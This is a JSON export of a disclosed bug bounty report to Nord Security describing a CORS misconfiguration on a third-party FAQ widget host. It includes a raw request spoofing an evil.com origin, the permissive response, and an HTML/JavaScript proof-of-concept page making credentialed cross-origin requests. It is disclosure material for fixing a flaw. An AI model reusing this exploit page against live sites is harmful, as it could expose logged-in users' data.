{"id":796557,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTY1NTc=","url":"https://hackerone.com/reports/796557","title":"Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2020-02-14T11:26:49.981Z","submitted_at":"2020-02-14T11:26:49.981Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hridoy-ahmed","url":"/hridoy-ahmed","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/DndgqSqjDbRwNYYofuP7QDsR/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17173,"url":"https://hackerone.com/nordsecurity","handle":"nordsecurity","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/eptyogy5wqa70kmvct1tgqbaa2fw/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22nordsec-mountain.png%22%3B%20filename%2A%3DUTF-8%27%27nordsec-mountain.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152858Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c6fbb0f00468ef238b6d9e534ebd5cd05233c0fc3575c1e22cae6c5c1da8a3ba","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/eptyogy5wqa70kmvct1tgqbaa2fw/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22nordsec-mountain.png%22%3B%20filename%2A%3DUTF-8%27%27nordsec-mountain.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152858Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=310c354142c6e48ce75ad0b58921ad94a055f38fcb73c5ff68c7bbeae9035a82"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nord Security","twitter_handle":"","website":"https://nordsecurity.com/","about":"Digital security and privacy for everyone"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-02-21T11:28:27.817Z","bug_reporter_agreed_on_going_public_at":"2020-02-16T05:39:13.408Z","team_member_agreed_on_going_public_at":"2020-02-21T11:28:27.736Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Summary:\n\nCross Origin Resource Sharing Misconfiguration | Lead to sensitive information.\nDescription:\n\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.\n\nPlatform(s) Affected: [website]\n\n*.nordvpncom\nSteps To Reproduce:\nProof Of Concept 1:\nWhen you get login ucp.nordvpn.com then check burpsuite httphistory there you get this api endpoint.\nRequest:\nGET /~nordvpn/api/widget/v1/faqs?format=json\u0026widgetType=float\u0026account=nordvpn\u0026configId=1047377312\u0026referer=https%3A%2F%2Fucp.nordvpn.com%2Flogin%2F HTTP/1.1\nHost: nordvpn.nanorep.co\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://ucp.nordvpn.com/login/\nOrigin: https://evil.com\nConnection: close\nCookie: u=v2,EU1,1DB7B8D10F64D9D7; bc.visitor_token=6633999527576281088; 3E6DB64A=cv_4#t_ED5D8790E#v_2#lv_ED5D87681#a_ED5D85839#e_00000000\n\nResponse:\nHTTP/1.1 200 Ok\nServer: nanoRepServer\nDate: Fri, 14 Feb 2020 11:19:39 GMT\nContent-type: application/json;charset=utf-8\nContent-Length: 1278\nX-XSS-Protection: 1; mode=block\nETag: \"8D7B13ADC1074A0Nordvpn_3E6DB64A_domain_3E6DB5A0_Float_\"\nPragma: no-cache\nVary: Origin\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\nExpires: Thu, 09 Jan 2020 07:35:14 GMT\nConnection: close\nX-Content-Type-Options: nosniff\n\n[{ \"title\": \"\", \"behavior\": 7, \"data\": [{ \"id\": 0, \"data\": [] }]}, { \"title\": \"FAQ\", \"behavior\": 7, \"data\": [{ \"id\": 0, \"data\": [{ \"label\": \"Connecting from a country with internet restrictions\",\"data\": 69566,\"objectId\": \"1047408742\",\"count\": 0,\"percent\": 7.44, \"likes\": 13281, \"titleAndBodyHash\": -41996297,\"visibility\":639},{ \"label\": \"How to securely watch Netflix with NordVPN?\",\"data\": 26765,\"objectId\": \"1047407532\",\"count\": 0,\"percent\": 2.86, \"likes\": 12456, \"titleAndBodyHash\": -489098654,\"visibility\":639},{ \"label\": \"Installing and using NordVPN on Debian, Ubuntu, and Linux Mint\",\"data\": 26268,\"objectId\": \"1325531132\",\"count\": 0,\"percent\": 2.81, \"likes\": 2150, \"titleAndBodyHash\": -403967674,\"visibility\":767},{ \"label\": \"What is your money-back policy?\",\"data\": 24180,\"objectId\": \"1047407702\",\"count\": 0,\"percent\": 2.59, \"likes\": 7983, \"titleAndBodyHash\": 1032988019,\"visibility\":639},{ \"label\": \"Connecting from a country with internet restrictions\",\"data\": 24130,\"objectId\": \"1161220812\",\"count\": 0,\"percent\": 2.58, \"likes\": 1482, \"titleAndBodyHash\": -1869781525,\"visibility\":639},{ \"label\": \"Setting up a router with NordVPN\",\"data\": 20777,\"objectId\": \"1047409322\",\"count\": 0,\"percent\": 2.22, \"likes\": 8849, \"titleAndBodyHash\": -257303784,\"visibility\":639}] }]}]\n\n\nPOC 2(save this as .html file and open you see my account details )\n\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n   \u003chead\u003e\n      \u003cscript\u003e\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n                        document.getElementById(\"emo\").innerHTML = alert(this.responseText);\n            }\n         };\n         xhttp.open(\"GET\", \"https://nordvpn.nanorep.co/~nordvpn/api/widget/v1/faqs?format=json\u0026widgetType=float\u0026account=nordvpn\u0026configId=1047377312\u0026referer=https%3A%2F%2Fucp.nordvpn.com%2Flogin%2F\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      \u003c/script\u003e\n   \u003c/head\u003e\n   \u003cbody\u003e\n      \u003ccenter\u003e\n      \u003ch2\u003eCORS PoC Exploit \u003c/h2\u003e\n      \u003ch3\u003ecreated by \u003ca href=\"https://facebook.com/hridoyahmedhridu\"\u003e@Hridoy\u003c/a\u003e\u003c/h3\u003e\n      \u003ch3\u003eShow full content of page\u003c/h3\u003e\n      \u003cdiv id=\"demo\"\u003e\n         \u003cbutton type=\"button\" onclick=\"cors()\"\u003eExploit\u003c/button\u003e\n      \u003c/div\u003e\n   \u003c/body\u003e\n\u003c/html\u003e\n\nHow to fix:\n\nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\n\nReference:\nhttps://hackerone.com/reports/426165\nhttps://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\n\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":716367,"file_name":"Kazam_screenshot_00024.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gHSrri7NSegS3Uh8uW1QHtkX?response-content-disposition=attachment%3B%20filename%3D%22Kazam_screenshot_00024.png%22%3B%20filename%2A%3DUTF-8%27%27Kazam_screenshot_00024.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152858Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0b3e0127211494f3c1e32bdab8f8dad1681d651901877ad4bc483043c974a27e","file_size":179575,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":39380,"asset_type":"URL","asset_identifier":"*.nordvpn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7053676,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Hello Hridoy,\n\nthanks for your report. Nanorep is a third party system so we can not fix the issue. But we reported your findings so they could fix.\n\nPlease note that we excluded third party services from our Bug Bounty program on Dec 9 and will not accept any more reports on Nanorep and other systems. See our policy for more details.","automated_response":false,"created_at":"2020-02-14T13:48:32.643Z","updated_at":"2020-02-14T13:48:32.643Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordsecurity","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7053794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But they steal users account data.they should fix this.","automated_response":false,"created_at":"2020-02-14T14:00:25.741Z","updated_at":"2020-02-14T14:00:25.741Z","actor":{"username":"hridoy-ahmed","cleared":false,"url":"/hridoy-ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/DndgqSqjDbRwNYYofuP7QDsR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7062604,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-16T05:39:13.425Z","updated_at":"2020-02-16T05:39:13.425Z","first_to_agree":true,"actor":{"username":"hridoy-ahmed","cleared":false,"url":"/hridoy-ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/DndgqSqjDbRwNYYofuP7QDsR/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordsecurity","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7110780,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-21T11:28:27.760Z","updated_at":"2020-02-21T11:28:27.760Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordsecurity","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7110781,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-02-21T11:28:27.835Z","updated_at":"2020-02-21T11:28:27.835Z","actor":{"username":"emanu","cleared":false,"url":"/emanu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nordsecurity","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}